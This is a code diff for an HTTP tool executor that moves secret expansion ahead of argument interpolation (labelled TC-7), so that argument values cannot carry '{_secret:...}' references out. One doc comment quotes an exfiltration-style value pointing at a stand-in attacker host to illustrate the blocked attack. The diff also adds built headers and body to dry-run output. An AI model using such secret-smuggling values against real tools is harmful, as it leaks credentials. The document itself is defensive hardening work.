@@ -545,6 +545,40 @@ function interpolate(template, context) {
 }
 
 /**
+ * Build the url, headers and body of an [http] request.
+ *
+ * Order matters (TC-7): `{_secret:name}` references are expanded on the
+ * manifest template FIRST, and only then are the validated arguments
+ * interpolated. Argument values are never scanned for secret references, so
+ * a value such as `https://attacker.example/?k={_secret:api_key}` is sent
+ * verbatim rather than carrying the secret out. This holds for `http.url`,
+ * every `http.headers` value and `http.body_template`, independently of the
+ * metacharacter check that also refuses braces in most argument types.
+ *
+ * @param {object} httpDef - The manifest's [http] section
+ * @param {object} context - Validated arguments for url and headers
+ * @param {object} bodyContext - Validated arguments for body_template
+ * @returns {{ url: string, headers: object, body: string|undefined }}
+ */
+function buildHttpRequest(httpDef, context, bodyContext) {
+  const url = interpolate(injectTemplateVars(httpDef.url), context);
+
+  const headers = {};
+  if (httpDef.headers) {
+    for (const [key, val] of Object.entries(httpDef.headers)) {
+      headers[key] = interpolate(injectTemplateVars(String(val)), context);
+    }
+  }
+
+  let body = undefined;
+  if (httpDef.body_template) {
+    body = interpolate(injectTemplateVars(httpDef.body_template), bodyContext);
+  }
+
+  return { url, headers, body };
+}
+
+/**
  * Evaluate a simple condition expression against the context.
  * Supports: "key != value", "key == value", "key != '' and other_key == ''"
  *
@@ -917,25 +951,15 @@ function executeHttpSync(manifest, args, options = {}) {
   const resolvedArgs = resolveArgs(manifest, args);
   const context = { ...resolvedArgs };
 
-  let url = interpolate(httpDef.url, context);
-  url = injectTemplateVars(url);
-
-  const headers = {};
-  if (httpDef.headers) {
-    for (const [key, val] of Object.entries(httpDef.headers)) {
-      headers[key] = injectTemplateVars(interpolate(val, context));
-    }
+  // JSON-escape values for safe interpolation into body templates
+  const escaped = {};
+  for (const [k, v] of Object.entries(context)) {
+    escaped[k] = JSON.stringify(String(v)).slice(1, -1);
   }
 
-  let body = undefined;
-  if (httpDef.body_template) {
-    // JSON-escape values for safe interpolation into body templates
-    const escaped = {};
-    for (const [k, v] of Object.entries(context)) {
-      escaped[k] = JSON.stringify(String(v)).slice(1, -1);
-    }
-    body = injectTemplateVars(interpolate(httpDef.body_template, escaped));
-  }
+  // Secrets are expanded on the template before any argument is
+  // interpolated (TC-7); see buildHttpRequest.
+  const { url, headers, body } = buildHttpRequest(httpDef, context, escaped);
 
   const method = (httpDef.method || "GET").toUpperCase();
   const scanId = `${Math.floor(Date.now() / 1000)}-${randomBytes(2).toString("hex")}`;
@@ -946,6 +970,11 @@ function executeHttpSync(manifest, args, options = {}) {
       scan_id: scanId,
       tool: manifest.tool.name,
       command: `${method} ${url}`,
+      http_method: method,
+      http_url: url,
+      http_headers: headers,
+      http_body: body,
+      resolvedArgs,
       timestamp: new Date().toISOString(),
     };
   }
@@ -1024,23 +1053,9 @@ export async function executeHttp(manifest, args, options = {}) {
   const resolvedArgs = resolveArgs(manifest, args);
   const context = { ...resolvedArgs };
 
-  // Interpolate URL with args and template vars
-  let url = interpolate(httpDef.url, context);
-  url = injectTemplateVars(url);
-
-  // Interpolate headers
-  const headers = {};
-  if (httpDef.headers) {
-    for (const [key, val] of Object.entries(httpDef.headers)) {
-      headers[key] = injectTemplateVars(interpolate(val, context));
-    }
-  }
-
-  // Interpolate body
-  let body = undefined;
-  if (httpDef.body_template) {
-    body = injectTemplateVars(interpolate(httpDef.body_template, context));
-  }
+  // Secrets are expanded on the template before any argument is
+  // interpolated (TC-7); see buildHttpRequest.
+  const { url, headers, body } = buildHttpRequest(httpDef, context, context);
 
   const method = (httpDef.method || "GET").toUpperCase();
 
